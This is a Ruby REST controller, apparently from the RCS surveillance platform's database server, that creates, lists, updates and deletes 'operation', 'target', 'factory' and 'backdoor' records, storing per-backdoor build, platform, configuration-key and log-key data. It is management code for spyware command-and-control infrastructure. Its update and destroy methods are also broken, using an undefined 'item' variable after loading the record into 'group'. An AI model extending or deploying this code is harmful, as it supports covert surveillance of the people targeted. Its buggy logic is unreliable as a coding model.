#
# Controller for Items
#


module RCS
module DB

class ItemController < RESTController
  
  def index
    require_auth_level :admin, :tech, :view

    filter = {}
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
    
    mongoid_query do
      items = ::Item.any_in(_id: @session[:accessible])
      filter.each_key do |k|
        items = items.any_in(k.to_sym => filter[k])
      end

      items = items.only(:name, :desc, :status, :_kind, :_path, :stat)
      RESTController.reply.ok(items)
    end
  end
  
  def show
    require_auth_level :admin, :tech, :view
    
    return RESTController.reply.not_found unless @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])
    
    mongoid_query do
      item = ::Item.find(@params['_id'])
      RESTController.reply.ok(item)
    end
  end
  
  def create
    # check they're asking to create a meaningful item
    return RESTController.reply.not_found unless ['operation', 'target', 'factory', 'backdoor'].include? @params['_kind']

    # enforce authorization levels
    check_auth_by_item_kind @params['_kind']

    mongoid_query do
      item = Item.create(name: @params['name']) do |doc|
        # common fields
        doc[:desc] = @params['desc']
        doc[:status] = @params['status']
        doc[:_kind] = @params['_kind']
        
        operation = ::Item.where({_id: @params['operation'], _kind: 'operation'}) if @params.has_key? 'operation'
        target = ::Item.where({_id: @params['target'], _kind: 'target'}) if @params.has_key? 'target'
        
        case doc[:_kind]
          when 'backdoor'
            doc[:_path] = [operation._id, target._id]
            doc[:stat] = Stat.new
            
            doc[:build] = @params['build']
            doc[:instance] = @params['instance']
            doc[:version] = @params['version']
            doc[:type] = @params['type']
            doc[:platform] = @params['platform']
            doc[:deleted] = @params['deleted']
            doc[:uninstalled] = @params['uninstalled']
            doc[:counter] = @params['counter']
            doc[:pathseed] = @params['pathseed']
            doc[:confkey] = @params['confkey']
            doc[:logkey] = @params['logkey']
            doc[:demo] = @params['demo']
            doc[:upgradable] = @params['upgradable']
          when 'factory'
            doc[:_path] = [operation._id, target._id]
          when 'target'
            doc[:_path] = [operation._id]
            doc[:stat] = Stat.new
          when 'operation'
            doc[:_path] = []
            doc[:stat] = Stat.new

            doc[:contact] = @params['contact']
        end
      end

      # make item accessible to this user
      @session[:accessible] << item
      
      RESTController.reply.ok(item)
    end
  end

  def update
    # enforce authorization levels
    check_auth_by_item_kind @params['_kind']

    # check item to destroy is accessible to this user
    return RESTController.reply.not_found unless is_accessible? @params['_kind']

    mongoid_query do
      group = Item.find(@params['_id'])
      @params.delete('_id')
      return RESTController.reply.not_found if item.nil?

      @params.each_pair do |key, value|
        if item[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => "#{item._kind}.update", item._kind.to_sym => item['name'], :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
        end
      end

      result = item.update_attributes(@params)

      return RESTController.reply.ok(group)
    end
  end

  def destroy
    # enforce authorization levels
    check_auth_by_item_kind @params['_kind']

    # check item to destroy is accessible to this user
    return RESTController.reply.not_found unless is_accessible? @params['_kind']

    mongoid_query do
      group = Item.find(@params['_id'])
      return RESTController.reply.not_found if item.nil?

      Audit.log :actor => @session[:user][:name], :action => "#{item._kind}.destroy", item._kind.to_sym => @params['name'], :desc => "Deleted #{item._kind} '#{item[:name]}'"

      group.destroy
      return RESTController.reply.ok
    end
  end

  private

  def check_auth_by_item_kind(kind)
    require_auth_level :admin if ['operation', 'target'].include? kind
    require_auth_level :tech if ['factory', 'backdoor'].include? kind
  end

  def is_accessible?(id)
    @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])
  end

end

end #DB::
end #RCS::